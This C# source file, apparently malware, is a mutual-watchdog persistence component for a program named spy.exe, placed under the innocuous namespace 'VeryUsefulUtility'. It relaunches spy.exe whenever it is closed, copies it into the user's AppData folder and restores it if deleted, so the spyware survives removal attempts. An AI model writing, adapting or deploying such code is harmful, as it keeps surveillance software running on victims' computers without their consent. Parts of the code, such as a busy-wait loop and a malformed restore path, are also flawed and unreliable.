using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VeryUsefulUtility
{
    internal class Program
    {
        static Process spyProcess = new Process();
        static string path = String.Empty;
        static string newPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
        static void Main(string[] args)
        {
           
            try
            {
                if (args.Length == 0)
                {
                    path = Path.Combine(Environment.CurrentDirectory, "spy.exe");

                    Task.Factory.StartNew(() => DuplicateFile());

                    spyProcess.StartInfo = new ProcessStartInfo(path, Process.GetCurrentProcess().ProcessName);
                    spyProcess.EnableRaisingEvents = true;
                    spyProcess.Exited += SpyProcess_Exited;
                    spyProcess.Start();
                }
                if (args.Length != 0)
                {
                    spyProcess = Process.GetProcessesByName(args[0])[0];
                    path = Process.GetProcessesByName(args[0])[0].MainModule.FileName;
                    spyProcess.StartInfo = new ProcessStartInfo(path, Process.GetCurrentProcess().ProcessName);
                    spyProcess.EnableRaisingEvents = true;
                    spyProcess.Exited += SpyProcess_Exited;
                }


                while (true)
                {

                }
            }
            catch (Exception)
            {
            }
        }

        private static void SpyProcess_Exited(object sender, EventArgs e)
        {
            spyProcess.Start();
        }

        private static void DuplicateFile()
        {
            while (true)
            {
                if (File.Exists(path))
                {
                    if (!File.Exists(Path.Combine(newPath, "spy.exe")))
                        File.Copy(path, Path.Combine(newPath, "spy.exe"));
                }
                else
                {
                    if (File.Exists(Path.Combine(newPath, "spy.exe")))
                        File.Copy(Path.Combine(newPath, "spy.exe"), Path.Combine(path, "spy.exe"));
                }
                Thread.Sleep(1000);
            }
        }

    }
}
